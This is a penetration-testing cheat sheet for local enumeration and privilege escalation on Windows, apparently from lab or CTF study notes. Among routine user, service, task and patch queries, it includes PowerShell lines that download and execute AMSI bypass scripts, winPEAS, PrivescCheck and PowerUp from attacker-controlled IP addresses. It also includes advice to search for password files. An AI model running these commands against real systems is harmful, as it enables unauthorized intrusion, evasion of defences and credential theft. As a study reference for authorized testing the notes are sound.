# Local Enumeration

{% code overflow="wrap" %}
```powershell
# Check current username and their privileges
whoami
whoami /priv

# System Information 
sysinfo

# List disks
fsutil fsinfo drives

# Enumerate unmounted disk
mountvol 

# check users 
net user
net user /doamin 
net group 
net group /domain

# show info on a particular user
net user <username>

# hostname
hostname

# AMSI bypass
> powershell
PS> IEX (new-Object Net.WebClient).DownloadString('http://20.0.0.200/privesc/amsi.txt')
PS> IEX (new-Object Net.WebClient).DownloadString('http://20.0.0.200/privesc/my-am-bypass.ps1')

# WinPEAS in disk
./winPEASAny.exe

# WinPEAS on memory
PS> $url = "http://10.10.14.16/privesc/winPEASany.exe" 
PS> $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

# List running services
net start
sc query
wmic service get
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName


sc qc <service name>
sq query <service name> 

# List running processes 
tasklist /SVC
wmic process

# List all running process by Administrator
tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" 
tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"

# Check all listening ports
netstat -ano

# Scheduled Tasks 
schtasks /query /fo LIST /v > log.txt
cat log.txt | grep "admin \|Task To Run"  
schtasks /run /tn "taskname"

# List scheduled tasks only for a current user context. You need to be SYSTEM to see all tasks.
Get-ScheduledTask

# Powrshell to organize the information
Get-ScheduledTask -TaskPath "\" |
    ForEach-Object { [pscustomobject]@{
     Server = $env:COMPUTERNAME
     Name = $_.TaskName
     Path = $_.TaskPath
     Description = $_.Description
     Author = $_.Author
     RunAsUser = $_.Principal.userid
     LastRunTime = $(($_ | Get-ScheduledTaskInfo).LastRunTime)
     LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult)
     NextRun = $(($_ | Get-ScheduledTaskInfo).NextRunTime)
     Status = $_.State
     Command = $_.Actions.execute
     Arguments = $_.Actions.Arguments }}

# Patch Info
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Run PrivescCheck.ps1
> powershell 
PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.14.127/privesc/PrivescCheck.ps1');Invoke-PrivescCheck -Extended

# Run PowerUp.ps1
PS>iex (new-Object Net.WebClient).DownloadString('http://192.168.49.124/privesc/PowerUp.ps1')|Import-Module PowerUp.ps1
PS>Invoke-AllChecks

# Run Windows Exploit Suggester NG
# Obtain systeminfo.txt from a Target machine

./wes.py --update
./wes.py systeminfo.txt -e # only known exploit 
./wes.py systeminfo.txt # all vulnerabilities 
```
{% endcode %}

### Metasploit - local exploit suggester

Check [Metasploit - local exploit suggeste](../../metasploit/local-exploit-suggester.md)r section.&#x20;

### Windows exploit suggester

```powershell
# Windows Terminal
systeminfo -> systeminfo.txt

# copy systeminfo.txt \\10.10.14.16\smb\

#Kali Terminal
cd /opt/privesc
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git

pip2 install xlrd --upgrade
(pip install xlrd --upgrade) 

cp systeminfo.txt /opt/privesc/win/Windows-Exploit-Suggester/

./windows-exploit-suggester.py --update

./windows-exploit-suggester.py --database <speadsheet>.xls --systeminfo <systeminfo.txt>

#If you have unspported excel format, please try the following commands: 

pip2 uninstall xlrd
pip2 install xlrd==1.2.0

```



### Some Checklists

* Do not forget enumerating all files in your first login directory!
* Do not forget enumerating all accessible files in C:/ directory!
* Do not forget enumerating all password files (_pass_, creds) in first login directory.
* Do not depend on winPEASAny.exe and PowerUP.ps tools to download and run them.
* Check Program Files, Program Files (86), and Program Data directories.&#x20;

